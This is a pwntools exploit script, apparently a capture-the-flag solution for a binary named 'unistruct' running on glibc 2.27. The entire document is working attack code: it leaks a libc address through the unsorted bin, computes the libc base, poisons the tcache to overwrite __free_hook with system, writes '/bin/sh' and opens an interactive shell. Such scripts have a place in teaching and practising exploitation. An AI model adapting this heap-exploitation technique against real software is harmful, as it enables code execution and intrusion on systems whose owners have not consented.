from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('unistruct')
# io = remote('node4.buuoj.cn', 26888)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so')
elf = ELF('unistruct')


def alloc(index, size):
    io.sendlineafter('Choice: ', '1')
    io.sendlineafter('Index: ', str(index))
    io.sendlineafter('Type: ', '4')
    io.sendlineafter('Value: ', str(size))


def enter_edit(index):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter('Index: ', str(index))


def edit0():
    io.recvuntil('Old value:')
    return int(io.recvline())


def edit1(val, inplace = False):
    if inplace:
        io.sendlineafter('place: ', '1')
    else:
        io.sendlineafter('place: ', '0')
    io.sendlineafter('New value: ', str(val))

def show(index):
    io.sendlineafter('Choice: ', '3')
    io.sendlineafter('Index: ', str(index))


def free(index):
    io.sendlineafter('Choice: ', '4')
    io.sendlineafter('Index: ', str(index))


def pwn():
    alloc(0, 1)                     # attack
    alloc(1, 1)                     # pad
    alloc(5, 1)                     # pad2
    alloc(2, 0x200)                 # unsorted leak
    alloc(3, 1)                     # pad
    alloc(4, 8)                     # pad2
    free(2)                         # unsorted_bin
    free(4)                         # tcache
    free(1)                         # tcache
    enter_edit(0)
    for i in range(4):
        edit1(0)
    for i in range(24):
        v = edit0()
        edit1(v, 1)
    low = edit0()
    edit1(low, 1)
    high = edit0()
    edit1(high, 1)
    libc_base = (high << 32) + low - libc.sym['__malloc_hook'] - 0x70
    log.success('libc_base: ' + hex(libc_base))
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    low = edit0()
    edit1(0xCAFEBABE, 1)            # exit

    alloc(6, 1)                     # victim
    alloc(7, 16)                    # realloc target
    alloc(8, 1)
    free(7)
    free(6)
    enter_edit(0)
    for i in range(4):
        edit1(0)
    edit1((__free_hook - 8) & 0xffffffff, 1)
    edit1(__free_hook >> 32, 1)
    edit1(0xCAFEBABE, 1)            # exit

    alloc(9, 4)
    enter_edit(9)
    bin_sh = u64(b'/bin/sh\x00')
    edit1(bin_sh & 0xffffffff, 1)
    edit1(bin_sh >> 32, 1)
    edit1(system & 0xffffffff, 1)
    edit1(system >> 32, 1)
    # gdb.attach(io)
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()

